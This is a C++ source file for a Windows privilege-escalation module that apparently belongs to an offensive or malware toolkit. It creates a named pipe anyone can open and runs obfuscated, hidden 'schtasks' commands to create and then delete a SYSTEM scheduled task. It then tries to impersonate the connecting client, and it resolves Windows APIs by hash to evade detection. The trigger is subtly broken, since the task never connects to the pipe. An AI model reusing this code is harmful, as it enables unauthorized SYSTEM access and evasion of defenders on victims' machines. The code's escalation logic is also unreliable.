#include "../include/NamedPipePrivEsc.h"
#include "../include/APIHashing.h"
#include "../include/StringObfuscation.h"
#include <iostream>
#include <sddl.h>
#include <lmcons.h>

using namespace std;

// Generate random pipe name using timestamp and PID
wstring NamedPipePrivEsc::GenerateRandomPipeName()
{
    DWORD random = GetTickCount() ^ GetCurrentProcessId();

    WCHAR pipeName[MAX_PATH];
    swprintf_s(pipeName, L"\\\\.\\pipe\\svcpipe_%08X", random);

    return wstring(pipeName);
}

// Create named pipe with Everyone DACL for connection
HANDLE NamedPipePrivEsc::CreateElevatedPipe(const wstring &pipeName)
{
    // Security descriptor allowing Everyone to connect
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;

    HANDLE hPipe = CreateNamedPipeW(
        pipeName.c_str(),
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        1024,
        1024,
        0,
        &sa);

    return hPipe;
}

// Trigger SYSTEM service to connect via scheduled task
BOOL NamedPipePrivEsc::TriggerSystemConnection(const wstring &pipeName)
{

#ifdef _DEBUG
    wcout << L"[PrivEsc] Attempting to trigger SYSTEM connection..." << endl;
#endif

    wstring cmdLine = wstring(OBFUSCATE_W(L"schtasks")) + L" /create /tn \"TempTask_\" /tr \"" +
                      wstring(OBFUSCATE_W(L"cmd")) + L" /c echo connection\" /sc once /st 00:00 /ru SYSTEM /f";

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(), NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Delete the task
        wstring delCmd = wstring(OBFUSCATE_W(L"schtasks")) + L" /delete /tn \"TempTask_\" /f";
        if (CreateProcessW(NULL, (LPWSTR)delCmd.c_str(), NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        return TRUE;
    }

    return FALSE;
}

// Main privilege escalation via named pipe impersonation
BOOL NamedPipePrivEsc::EscalatePrivileges()
{
    if (IsSystemUser())
    {
#ifdef _DEBUG
        wcout << L"[PrivEsc] Already running as SYSTEM" << endl;
#endif
        return TRUE;
    }

#ifdef _DEBUG
    wcout << L"[PrivEsc] Starting Named Pipe impersonation..." << endl;
#endif

    // Generate random pipe name
    wstring pipeName = GenerateRandomPipeName();

#ifdef _DEBUG
    wcout << L"[PrivEsc] Pipe name: " << pipeName << endl;
#endif

    // Create pipe
    HANDLE hPipe = CreateElevatedPipe(pipeName);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
#ifdef _DEBUG
        wcout << L"[PrivEsc] Failed to create pipe" << endl;
#endif
        return FALSE;
    }

    // Trigger SYSTEM connection
    if (!TriggerSystemConnection(pipeName))
    {
        CloseHandle(hPipe);
        return FALSE;
    }

    // Wait for connection
    BOOL connected = ConnectNamedPipe(hPipe, NULL);
    if (!connected && GetLastError() != ERROR_PIPE_CONNECTED)
    {
#ifdef _DEBUG
        wcout << L"[PrivEsc] No connection received" << endl;
#endif
        CloseHandle(hPipe);
        return FALSE;
    }

#ifdef _DEBUG
    wcout << L"[PrivEsc] Connection established, impersonating..." << endl;
#endif

    // Impersonate connected client (SYSTEM)
    if (!ImpersonateNamedPipeClient(hPipe))
    {
#ifdef _DEBUG
        wcout << L"[PrivEsc] Impersonation failed" << endl;
#endif
        CloseHandle(hPipe);
        return FALSE;
    }

#ifdef _DEBUG
    wcout << L"[PrivEsc] Successfully escalated to SYSTEM" << endl;
#endif

    return TRUE;
}

// Check if current user is NT AUTHORITY
BOOL NamedPipePrivEsc::IsSystemUser()
{
    HANDLE hToken = NULL;
    typedef BOOL(WINAPI * pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
    auto fnOpenToken = (pOpenProcessToken)APIResolver::ResolveAPI(APIHash::OpenProcessToken);
    if (!fnOpenToken || !fnOpenToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        return FALSE;
    }

    DWORD length = 0;
    typedef BOOL(WINAPI * pGetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
    auto fnGetToken = (pGetTokenInformation)APIResolver::ResolveAPI(APIHash::GetTokenInformation);
    if (!fnGetToken)
    {
        CloseHandle(hToken);
        return FALSE;
    }

    fnGetToken(hToken, TokenUser, NULL, 0, &length);

    TOKEN_USER *pTokenUser = (TOKEN_USER *)malloc(length);
    if (!pTokenUser)
    {
        CloseHandle(hToken);
        return FALSE;
    }

    BOOL isSystem = FALSE;
    if (fnGetToken(hToken, TokenUser, pTokenUser, length, &length))
    {
        // Check if SID is NT AUTHORITY
        PSID pSystemSid = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

        if (AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
                                     0, 0, 0, 0, 0, 0, 0, &pSystemSid))
        {
            isSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
            FreeSid(pSystemSid);
        }
    }

    free(pTokenUser);
    CloseHandle(hToken);

    return isSystem;
}
